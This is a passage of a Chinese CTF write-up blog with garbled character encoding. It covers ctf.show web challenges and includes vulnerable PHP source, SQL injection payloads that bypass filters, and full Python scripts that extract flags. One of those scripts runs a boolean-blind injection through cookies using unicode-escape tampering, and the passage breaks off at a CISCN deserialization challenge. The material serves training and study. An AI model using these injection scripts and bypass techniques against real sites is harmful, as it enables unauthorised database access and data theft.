class="variable">$arr</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/load|and|\||\&amp;| |\\\|sleep|ascii|if/i&quot;</span>,<span class="variable">$arr</span>))&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;bad hacker!&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">           <span class="keyword">die</span>();   </span><br><span class="line">       &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;db.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;e&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;u&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;p&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$e</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> =</span><br><span class="line"><span class="string">&quot;insert into test1 set email = &#x27;<span class="subst">$e</span>&#x27;,username = &#x27;<span class="subst">$u</span>&#x27;,password = &#x27;<span class="subst">$p</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$e</span>)&amp;&amp;<span class="title function_ invoke__">check</span>(<span class="variable">$u</span>)&amp;&amp;<span class="title function_ invoke__">check</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:login.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>user.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body background=<span class="string">&quot;bg2.jpg&quot;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;db.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;u&#x27;</span>])&#123;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$username</span>))</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)&gt;<span class="number">10</span>) &#123;</span><br><span class="line">			<span class="variable">$username</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$username</span>,<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Hello <span class="subst">$username</span>,there&#x27;s nothing here but dog food!&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;The username can only be a number.How did you get here?go out!!!&#x27;);location.href=&#x27;login.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Login first!&#x27;);location.href=&#x27;login.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é€šè¿‡æ³¨å†Œç•Œé¢çš„union select</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span>&quot;select username from test1 where email=&#x27;$e&#x27; and password=&#x27;$p&#x27;&quot;;</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span>&quot;insert into test1 set email = &#x27;$e&#x27;, username = &#x27;$u&#x27;,password = &#x27;$p&#x27;&quot;</span><br></pre></td></tr></table></figure>

<p>æ„é€ sqlè¯­å¥</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test1 <span class="keyword">set</span> email<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>,username<span class="operator">=</span>hex(hex(substr((<span class="keyword">select</span><span class="comment">/**/</span>flag<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flag),<span class="number">1</span>,<span class="number">1</span>))),password<span class="operator">=</span><span class="string">&#x27;0&#x27;</span></span><br></pre></td></tr></table></figure>

<p>è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&quot;http://7fc1279d-6a4b-4fca-968f-235322686f5b.challenge.ctf.show/register.php&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://7fc1279d-6a4b-4fca-968f-235322686f5b.challenge.ctf.show/login.php&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    payload = <span class="string">&quot;hex(hex(substr((select/**/flag/**/from/**/flag)from/**/&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;/**/for/**/1))),/*&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    s = requests.session()</span><br><span class="line">    data1 = &#123;</span><br><span class="line">        <span class="string">&#x27;e&#x27;</span>: <span class="built_in">str</span>(i + <span class="number">30</span>) + <span class="string">&quot;&#x27;,username=&quot;</span> + payload,</span><br><span class="line">        <span class="string">&#x27;u&#x27;</span>: <span class="string">&quot;*/#&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;p&#x27;</span>: i + <span class="number">30</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># print(data1[&#x27;e&#x27;])</span></span><br><span class="line">    r1 = s.post(url1, data=data1)</span><br><span class="line">    data2 = &#123;</span><br><span class="line">        <span class="string">&#x27;e&#x27;</span>: i + <span class="number">30</span>,</span><br><span class="line">        <span class="string">&#x27;p&#x27;</span>: i + <span class="number">30</span></span><br><span class="line">    &#125;</span><br><span class="line">    r2 = s.post(url2, data=data2)</span><br><span class="line">    t = r2.text</span><br><span class="line">    real = re.findall(<span class="string">&quot;Hello (.*?),&quot;</span>, t)[<span class="number">0</span>]</span><br><span class="line">    flag += real</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240715172712301.png" alt="image-20240715172712301"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240715172731195.png" alt="image-20240715172731195"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;88827b24-2cd9-4be6-b15d-7eb1055f9c1c&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web15-Fishman-1"><a href="#web15-Fishman-1" class="headerlink" title="web15 Fishman"></a>web15 Fishman</h2><p>æ‰«åˆ°å¤‡ä»½æ–‡ä»¶</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240715192511338.png" alt="image-20240715192511338"></p>
<p>member.phpä¸­å‘ç°æ¼æ´ç‚¹</p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240715192603206.png" alt="image-20240715192603206"></p>
<p>å½“æŸ¥è¯¢è¿”å›çš„ç”¨æˆ·åä¸ºç©ºä¸”å¯†ç é”™è¯¯æ—¶ï¼Œè¿›è¡Œå››æ¬¡setcookieæ“ä½œï¼Œå½“æŸ¥è¯¢è¿”å›çš„ç”¨æˆ·åä¸ºä¸ä¸ºç©ºæ—¶ï¼Œè¿›è¡Œä¸¤æ¬¡setcookieæ“ä½œåˆ©ç”¨è¿™ä¸ªå·®å¼‚ï¼Œå°±å·²ç»å¯ä»¥å®ç°å¸ƒå°”ç›²æ³¨äº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://6209bf27-efaa-4086-b619-a9552f4450f6.challenge.ctf.show/admin/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload</span>):</span><br><span class="line">    payload = payload.lower()</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;\\u0075&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\u0027&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;\\u006f&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;\\u0069&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\\u0022&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\\u0020&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;\\u0073&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;\\u0023&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\\u003e&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;\\u003c&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;\\u002d&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;\\u003d&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;f1a9&#x27;</span>, <span class="string">&#x27;F1a9&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;f1&#x27;</span>, <span class="string">&#x27;F1&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get database length</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">databaseName_len</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start get database name length...&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">45</span>):</span><br><span class="line">        payload = <span class="string">&quot;1&#x27; or (length(database())=&quot;</span> + <span class="built_in">str</span>(l + <span class="number">1</span>) + <span class="string">&quot;)#&quot;</span></span><br><span class="line">        payload = tamper(payload)</span><br><span class="line">        tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">        headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">        r = requests.get(url, headers=headers)</span><br><span class="line">        myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">        <span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">1</span>)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;get db length = &#x27;</span> + <span class="built_in">str</span>(l).lower())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get content</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_databaseName</span>():</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">15</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\\&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload = <span class="string">&quot;1&#x27; or (select (database()) between &#x27;&quot;</span> + flag + <span class="built_in">chr</span>(c) + <span class="string">&quot;&#x27; and &#x27;&quot;</span> + <span class="built_in">chr</span>(<span class="number">126</span>) + <span class="string">&quot;&#x27;)#&quot;</span></span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            payload = tamper(payload)</span><br><span class="line">            tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">            headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">            r = requests.get(url, headers=headers)</span><br><span class="line">            myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">            <span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">2</span>)):</span><br><span class="line">                flag += <span class="built_in">chr</span>(c - <span class="number">1</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;databasename = &#x27;</span> + flag.lower())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get content</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_tableName</span>():</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">30</span>):  <span class="comment"># blind inject</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\\&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload = <span class="string">&quot;1&#x27; or (select (select table_name from information_schema.tables where table_schema=database() limit 3,1) between &#x27;&quot;</span> + flag + <span class="built_in">chr</span>(</span><br><span class="line">                    c) + <span class="string">&quot;&#x27; and &#x27;&quot;</span> + <span class="built_in">chr</span>(<span class="number">126</span>) + <span class="string">&quot;&#x27;)#&quot;</span></span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            payload = tamper(payload)</span><br><span class="line">            tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">            headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">            r = requests.get(url, headers=headers)</span><br><span class="line">            myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">            <span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">2</span>)):</span><br><span class="line">                flag += <span class="built_in">chr</span>(c - <span class="number">1</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;tablename = &#x27;</span> + flag.lower())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get content</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ColumnName</span>():</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):  <span class="comment"># blind inject</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\\&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload = <span class="string">&quot;1&#x27; or (select (select column_name from information_schema.columns where table_name=&#x27;FL2333G&#x27; limit 0,1) between &#x27;&quot;</span> + flag + <span class="built_in">chr</span>(</span><br><span class="line">                    c) + <span class="string">&quot;&#x27; and &#x27;&quot;</span> + <span class="built_in">chr</span>(<span class="number">126</span>) + <span class="string">&quot;&#x27;)#&quot;</span></span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            payload = tamper(payload)</span><br><span class="line">            tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">            headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">            r = requests.get(url, headers=headers)</span><br><span class="line">            myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">            <span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">2</span>)):</span><br><span class="line">                flag += <span class="built_in">chr</span>(c - <span class="number">1</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;column name = &#x27;</span> + flag.lower())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get content</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_value</span>():</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">50</span>):  <span class="comment"># blind inject</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\\&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload = <span class="string">&quot;1&#x27; or (select (select FLLLLLAG from FL2333G) between &#x27;&quot;</span> + flag + <span class="built_in">chr</span>(c) + <span class="string">&quot;&#x27; and &#x27;&quot;</span> + <span class="built_in">chr</span>(</span><br><span class="line">                    <span class="number">126</span>) + <span class="string">&quot;&#x27;)#&quot;</span></span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            payload = tamper(payload)</span><br><span class="line">            tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">            headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">            r = requests.get(url, headers=headers)</span><br><span class="line">            myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">            <span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">2</span>)):</span><br><span class="line">                flag += <span class="built_in">chr</span>(c - <span class="number">1</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;flag = &#x27;</span> + flag.lower())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;start database sql injection...&quot;</span>)</span><br><span class="line"><span class="comment"># databaseName_len()</span></span><br><span class="line"><span class="comment"># get_databaseName()</span></span><br><span class="line"><span class="comment"># get_tableName()</span></span><br><span class="line"><span class="comment"># get_ColumnName()</span></span><br><span class="line">get_value()</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240715204411268.png" alt="image-20240715204411268"></p>
<h2 id="CISCN-2023-ååŒ—-ez-date-1"><a href="#CISCN-2023-ååŒ—-ez-date-1" class="headerlink" title="[CISCN 2023 ååŒ—]ez_date"></a>[CISCN 2023 ååŒ—]ez_date</h2><p>æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;a)||<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;b))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no array&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a !== <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b)) )&#123;</span><br><span class="line">            <span class="variable">$content</span>=<span class="title function_ invoke__">date</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="variable">$uuid</span>=<span class="title function_ invoke__">uniqid</span>().<span 